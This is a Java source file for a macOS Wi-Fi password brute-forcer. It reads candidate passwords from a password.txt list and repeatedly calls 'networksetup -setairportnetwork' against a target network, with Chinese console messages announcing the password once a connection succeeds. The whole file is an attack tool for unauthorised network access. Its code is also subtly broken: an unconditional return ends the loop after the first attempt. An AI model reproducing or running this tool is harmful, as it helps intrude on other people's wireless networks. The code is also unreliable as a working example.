package com.alialiso.wifi;

import com.sun.xml.internal.bind.v2.runtime.output.Encoded;

import java.util.List;

public class MacApp {
    static String CONNECT = "networksetup -setairportnetwork en0 WIFI_NAME WIFI_PASSWORD";
    static String wifiname = "apple";

    public static void main(String[] args) {
        try {

            boolean next = true;
            int pageSize = 1;
            while(next){
                List<String> passwords = FileUtils.readLine(WindowsApp.APP_DIR+"/password.txt", pageSize * 1000, (pageSize + 1) * 1000 - 1);
                pageSize++;
                if (passwords != null && passwords.size() != 0){
                    for (String password : passwords) {
                        Long t1 = System.currentTimeMillis();
                        String cmd = MacApp.CONNECT.replace("WIFI_NAME",wifiname).replace("WIFI_PASSWORD",password);
                        List<String> execute = CMDUtil.execute(cmd, null);

                        System.out.println(execute.toString());
                        if (execute.toString().equals("[]")){
                            System.out.println("连接成功，密码是："+password);
                            return;
                        }
                        if (execute.toString().contains("Could not find network")){
                            System.out.println("连接失败，找不到wifi");
                            return;
                        }
                        Long t2 = System.currentTimeMillis();
                        System.out.println("用时："+ (t2-t1));
                        return;
                    }
                }else{
                    next = false;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
